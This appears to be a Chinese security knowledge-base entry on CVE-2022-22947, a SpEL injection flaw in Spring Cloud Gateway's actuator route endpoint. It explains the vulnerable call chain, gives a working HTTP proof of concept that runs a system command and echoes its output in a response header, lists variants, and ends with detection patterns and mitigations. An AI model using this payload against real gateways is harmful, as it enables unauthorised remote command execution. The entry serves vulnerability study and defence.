---
id: web-java-expression-spel-spring-cloud-gateway-22947-actuator-route-rce
title: Spring Cloud Gateway actuator 路由创建 SpEL 注入命令执行（CVE-2022-22947）
type: scenario
domain: web
path: web/java/expression/spel
technique: gateway-actuator-route-spel-injection-rce
tags:
- java
- spring
- spring-cloud-gateway
- spel
- expression-injection
- rce
- actuator
- cve-2022-22947
cve:
- CVE-2022-22947
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V14
  verified_at: '2026-11-05T01:48:19+08:00'
  notes: 已对照原文与29张图核对；getValue StandardEvaluationContext、normalizeProperties链、AddResponseHeader回显PoC、refresh流程一致；原文仅以3.1.0演示未给受影响区间未设版本；未复现
url: /docs/web/java/expression/spel/web-java-expression-spel-spring-cloud-gateway-22947-actuator-route-rce/
draft: false
kb_aliases:
- CVE-2022-22947
- Spring Cloud Gateway SpEL RCE
- actuator gateway routes 注入
- AddResponseHeader SpEL 回显
- ShortcutConfigurable getValue
---

## 一句话结论

Spring Cloud Gateway 在处理通过 actuator 创建/刷新的路由定义时，会用 `StandardEvaluationContext` 对 filter 的 shortcut 参数做 SpEL 求值；攻击者只要能让 `POST /actuator/gateway/routes/{id}` 和 refresh 可达，就能用 `T(java.lang.Runtime)` 执行命令，并借助 `AddResponseHeader` 把命令输出回显在响应头中。

## 原理

- 路由定义中的 filter 参数在 `ShortcutConfigurable#getValue()` 里被判断：字符串以 `#{` 开头、以 `}` 结尾时按 SpEL 表达式解析并求值，否则原样返回。求值使用 `StandardEvaluationContext` 并注册 `BeanFactoryResolver`，因此 `T(...)` 类型引用、`new` 构造器和任意方法调用都可用。
- 调用链为 `ConfigurationService#normalizeProperties` → `ShortcutType#normalize` → `getValue`：保存路由时，filter 的 `args` 键值对被逐项 normalize，攻击者可控的 `args.value` 因此进入 SpEL 求值器，结果被替换回配置。
- 路由由 `AbstractGatewayControllerEndpoint#save` 处理；`RouteDefinition` 含 `filters`，每个 `FilterDefinition` 有 `name` 与 `args`。保存前会校验 `name` 必须是已注册的 `GatewayFilterFactory`，因此需选一个真实存在的过滤器和可回显的参数。
- `AddResponseHeaderGatewayFilterFactory` 的 `apply` 会把 `config.name`/`config.value` 添加到响应头，`NameValueConfig.value` 是字符串，正好能承载 SpEL 求值结果；访问该路由即可看到回显。
- 创建路由时 `uri` 和 `order` 必须存在：`Route#async` 会读取它们，缺失会空指针；`uri` 还要满足正常 URL 格式。

## 触发条件

- 目标为使用受影响的 Spring Cloud Gateway（原文以 3.1.0 演示）。
- Gateway actuator 路由管理端点可达且无需认证：`management.endpoints.web.exposure.include` 暴露了 gateway。
- 攻击者能提交路由定义并触发 refresh，即 `POST /actuator/gateway/routes/{id}` 与 `POST /actuator/gateway/refresh` 可访问。
- 目标未启用 CVE-2022-22947 的修复（修复将 `StandardEvaluationContext` 换为受限的 `GatewayEvaluationContext`）。

## 利用步骤

1. 确认 actuator 可达，尝试读取 `/actuator/gateway/routes`。
2. 向 `/actuator/gateway/routes/{id}` 提交一个带 `AddResponseHeader` 过滤器的路由，`args.value` 放入 SpEL；`uri`、`order` 必填。
3. 调用 `/actuator/gateway/refresh` 刷新路由。
4. 访问该路由或读取路由定义，SpEL 结果（命令输出）会出现在响应头/序列化结果中。

## PoC

创建路由：

```http
POST /actuator/gateway/routes/test1 HTTP/1.1
Content-Type: application/json

{
  "id": "test1",
  "filters": [
    {
      "name": "AddResponseHeader",
      "args": {
        "name": "cmd123",
        "value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
      }
    }
  ],
  "uri": "http://any.com",
  "order": 0
}
```

刷新：

```http
POST /actuator/gateway/refresh HTTP/1.1
```

访问创建的路由即可在 `cmd123` 响应头看到 `id` 的输出；也可 `GET /actuator/gateway/routes/test1` 观察已求值的 filter 配置。

## 变体与关联

- 变体：换成 `SetResponseHeader`、`AddRequestHeader` 等接受 `NameValueConfig` 的过滤器，把结果写入请求/响应头实现回显。
- 变体：无需回显时直接 `T(java.lang.Runtime).getRuntime().exec(...)` 盲打，或用 `StreamUtils` 把输出写入响应。
- 变体：其他接受 shortcut 参数的过滤器同样会经过 normalize，不限于 AddResponseHeader。
- 关联：[[web-java-expression-spel-injection-to-rce]]（SpEL 通用原理与 T()/new 利用）。
- 关联：[[web-java-expression-spel-spring-cloud-gateway-property-method-chain]]（2022 修复后仍可利用的属性写链，CVE-2025-41243）。
- 关联：[[web-java-expression-spel-no-echo-exfil-streamutils]]（无回显时的输出读取与外带）。

## 检测与防御

- 检测：`/actuator/gateway/routes` 出现外部 POST、请求体含 `#{`、`T(`、`Runtime`、`ProcessBuilder`、`StreamUtils`；随后紧跟 `/actuator/gateway/refresh`。
- 检测：路由定义日志中出现 SpEL 表达式或异常 `SpelEvaluationException`；响应头出现异常的命令输出。
- 防御：升级到修复 CVE-2022-22947 的版本；actuator 仅内网/认证可达，关闭 gateway 管理端点。
- 加固：不要暴露路由管理 API 给外部；对路由 filter 参数做白名单，拒绝 `#{` 表达式；Web 进程最小权限运行。
